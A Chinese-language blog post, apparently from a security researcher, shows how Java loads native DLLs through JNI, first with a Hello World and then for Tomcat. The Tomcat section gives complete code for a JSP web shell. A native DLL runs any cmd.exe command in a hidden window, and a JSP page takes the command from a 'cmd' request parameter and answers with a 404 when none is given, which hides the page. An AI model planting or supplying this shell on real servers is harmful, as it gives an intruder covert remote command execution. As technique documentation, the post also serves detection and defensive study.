---
layout: post
title: Java利用技巧——通过JNI加载dll
---



## 0x00 前言
---

Java可以通过JNI接口访问本地的动态连接库，从而扩展Java的功能。本文将以Tomcat环境为例，介绍通过jsp加载dll的方法，开源代码，记录细节。

## 0x01 简介
---

本文将要介绍以下内容：

- 基础知识
- Java通过JNI加载dll的方法
- jsp通过JNI加载dll的方法

## 0x02 基础知识
---

JNI，全称Java Native Interface，是Java语言的本地编程接口。可以用来调用dll文件

调用JNI接口的步骤：

1. 编写Java代码，注明要访问的本地动态连接库和本地方法
2. 编译Java代码得到.class文件
3. 使用javah生成该类对应的.h文件
4. 使用C++实现函数功能，编译生成dll
5. 通过Java调用dll

## 0x03 Java通过JNI加载dll的方法
---

本节将要实现通过Java加载dll，在命令行输出`"Hello World"`

### 1.编写Java代码，注明要访问的本地动态连接库和本地方法

HelloWorld.java:

```
public class HelloWorld {
	private native void print();
	static
	{
		System.loadLibrary("Hello");
	}
	public static void main(String[] args) {
		new HelloWorld().print();
	}
}
```

**注：**

也可以使用`System.load`指定加载dll的绝对路径，代码示例：`System.load("c:\\test\\Hello.dll");`

上述代码注明了要访问本地的Hello.dll，调用本地方法`print()`

### 2.编译Java代码得到.class文件

cmd命令：

```
javac HelloWorld.java
```

命令执行后，生成文件HelloWorld.class

### 3.使用javah生成该类对应的.h文件

cmd命令：

```
javah -jni HelloWorld
```

命令执行后，生成文件HelloWorld.h

为了简化后续C++工程的配置，这里需要修改HelloWorld.h，将`#include <jni.h>`修改为`#include "jni.h"`，修改后的内容如下：

```
/* DO NOT EDIT THIS FILE - it is machine generated */
#include "jni.h"
/* Header for class HelloWorld */

#ifndef _Included_HelloWorld
#define _Included_HelloWorld
#ifdef __cplusplus
extern "C" {
#endif
/*
 * Class:     HelloWorld
 * Method:    print
 * Signature: ()V
 */
JNIEXPORT void JNICALL Java_HelloWorld_print
  (JNIEnv *, jobject);

#ifdef __cplusplus
}
#endif
#endif
```

### 4.使用C++实现函数功能，编译生成dll

使用Visual Studio，新建一个C++项目Hello，选中win2控制台应用程序， 应用程序类型为DLL，附加选项：导出符号

修改dllmain.cpp或者Hello.cpp均可，具体代码如下：

```
#include"jni.h"
#include<stdio.h>
#include"HelloWorld.h"
JNIEXPORT void JNICALL 
Java_HelloWorld_print(JNIEnv *env, jobject obj)
{
	printf("Hello World!\n");
	return;
}
```

项目需要引用以下三个文件：

- jni.h，位置为`%jdk%\include\jni.h`
- jni_md.h，位置为`%jdk%\include\win32\jni_md.h`
- HelloWorld.h，使用javah生成

编译生成dll

**注：**

测试环境为64位系统，所以选择生成64位的Hello.dll

### 5.通过Java调用dll

将Hello.dll和HelloWorld.class保存在同级目录，执行命令：

```
java HelloWorld
```

获得返回结果：

```
Hello World!
```

加载成功

## 0x04 jsp通过JNI加载dll的方法
---

本节将要实现在Tomcat环境下，通过访问jsp文件，执行cmd命令并获得命令执行结果

### 1.编写Java代码，注明要访问的本地动态连接库和本地方法

testtomcat_jsp.java:

```
package org.apache.jsp;
public class testtomcat_jsp
{
  class JniClass
  {
       public native String exec( String string );
  }
}
```

Tomcat环境下，需要以下限制条件：

- 固定包名格式为org.apache.jsp
- java文件名称需要固定格式：`***_jsp`，并且后面的jsp文件名称需要同其保持一致。例如`testtomcat_jsp.java`，那么最终jsp的文件名称需要命名为`testtomcat.jsp`
- 类名不需要限定为JniClass，可以任意

### 2.编译Java代码得到.class文件

cmd命令：

```
javac testtomcat_jsp.java
```

命令执行后，生成文件`testtomcat_jsp.class`和`testtomcat_jsp$JniClass.class`

### 3.使用javah生成该类对应的.h文件

将`testtomcat_jsp$JniClass.class`保存在`\org\apache\jsp\`下

cmd命令：

```
javah -jni org.apache.jsp.testtomcat_jsp$JniClass
```

命令执行后，生成文件`org_apache_jsp_testtomcat_jsp_JniClass.h`

为了简化后续C++工程的配置，这里需要修改`org_apache_jsp_testtomcat_jsp_JniClass.h`，将`#include <jni.h>`修改为`#include "jni.h"`，修改后的内容如下：

```
/* DO NOT EDIT THIS FILE - it is machine generated */
#include "jni.h"
/* Header for class org_apache_jsp_testtomcat_jsp_JniClass */

#ifndef _Included_org_apache_jsp_testtomcat_jsp_JniClass
#define _Included_org_apache_jsp_testtomcat_jsp_JniClass
#ifdef __cplusplus
extern "C" {
#endif
/*
 * Class:     org_apache_jsp_testtomcat_jsp_JniClass
 * Method:    exec
 * Signature: (Ljava/lang/String;)Ljava/lang/String;
 */
JNIEXPORT jstring JNICALL Java_org_apache_jsp_testtomcat_1jsp_00024JniClass_exec
  (JNIEnv *, jobject, jstring);

#ifdef __cplusplus
}
#endif
#endif
```

### 4.使用C++实现函数功能，编译生成dll

使用Visual Studio，新建一个C++项目TestTomcat，选中win2控制台应用程序， 应用程序类型为DLL，附加选项：导出符号

修改dllmain.cpp或者TestTomcat.cpp均可，具体代码如下：

```
#include "jni.h"
#include "org_apache_jsp_testtomcat_jsp_JniClass.h"
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#pragma comment(lib, "User32.lib")

char *ExeCmd(WCHAR *pszCmd)
{
	SECURITY_ATTRIBUTES sa;
	HANDLE hRead, hWrite;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		return ("[!] CreatePipe failed.");
	}

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	WCHAR command[MAX_PATH];
	wsprintf(command, L"cmd.exe /c %ws", pszCmd);

	if (!CreateProcess(NULL, command, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
		return ("[!] CreateProcess failed.");

	CloseHandle(hWrite);

	char buffer[4096] = { 0 };

	DWORD bytesRead;
	char strText[32768] = { 0 };

	while (true)
	{
		if (ReadFile(hRead, buffer, 4096 - 1, &bytesRead, NULL) == NULL)
			break;
		sprintf_s(strText, "%s\r\n%s", strText, buffer);
		memset(buffer, 0, sizeof(buffer));

	}
	return strText;
}
JNIEXPORT jstring JNICALL Java_org_apache_jsp_testtomcat_1jsp_00024JniClass_exec(JNIEnv *env, jobject class_object, jstring jstr)
{
	WCHAR *command = (WCHAR*)env->GetStringChars(jstr, 0);
	char *data = ExeCmd(command);
	jstring cmdresult = (env)->NewStringUTF(data);
	return cmdresult;
}
```

**注：**

代码`JNIEXPORT jstring JNICALL Java_org_apache_jsp_testtomcat_1jsp_00024JniClass_exec(JNIEnv *env, jobject class_object, jstring jstr)`需要和头文件中的声明保持一致

项目需要引用以下三个文件：

- jni.h，位置为`%jdk%\include\jni.h`
- jni_md.h，位置为`%jdk%\include\win32\jni_md.h`
- org_apache_jsp_testtomcat_jsp_JniClass.h，使用javah生成

编译生成dll

**注：**

测试环境为64位系统，所以选择生成64位的TestTomcat.dll

### 5.通过jsp调用dll

向Tomcat上传TestTomcat.dll，在Web目录创建testtomcat.jsp，内容如下：

```
<%!
	class JniClass {
   		public native String exec(String string);
   		public JniClass() {
    	 	System.load("c:\\test\\TestTomcat.dll");
  		}
	}
%>
<%
 	String cmd  = request.getParameter("cmd");
  	if (cmd != null) {
 		JniClass a = new JniClass();
 		String res = a.exec(cmd);
 		out.println(res);
 	}
    else{
        response.sendError(404);
    }
%>
```

**注：**

jsp文件名称需要同之前的java文件保持一致

访问URL:http://127.0.0.1:8080/testtomcat.jsp?cmd=whoami

获得命令执行结果，加载成功

## 0x05 小结
---

本文以Tomcat环境为例，介绍通过jsp加载dll的方法，开源代码，记录细节，能够扩展jsp的功能。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)









